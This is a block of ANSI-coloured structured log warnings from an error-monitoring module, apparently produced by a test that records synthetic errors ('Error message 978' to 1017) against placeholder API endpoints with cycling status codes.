WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737907Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 978'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737956Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 979'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738005Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 980'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738054Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 981'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738102Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 982'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738151Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 983'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738201Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 984'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738335Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 985'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738405Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 986'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738462Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 987'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738516Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 988'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738569Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 989'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 990'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738673Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 991'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738725Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 992'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738776Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 993'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738827Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 994'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738877Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 995'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738926Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 996'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.738976Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 997'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739025Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 998'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739073Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 999'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1000'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739170Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1001'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739219Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1002'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739267Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1003'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739316Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1004'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739364Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1005'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739412Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1006'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1007'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739509Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1008'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739559Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1009'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1010'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739660Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1011'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739711Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1012'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739765Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1013'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739817Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1014'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1015'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739916Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1016'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.739967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1017'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
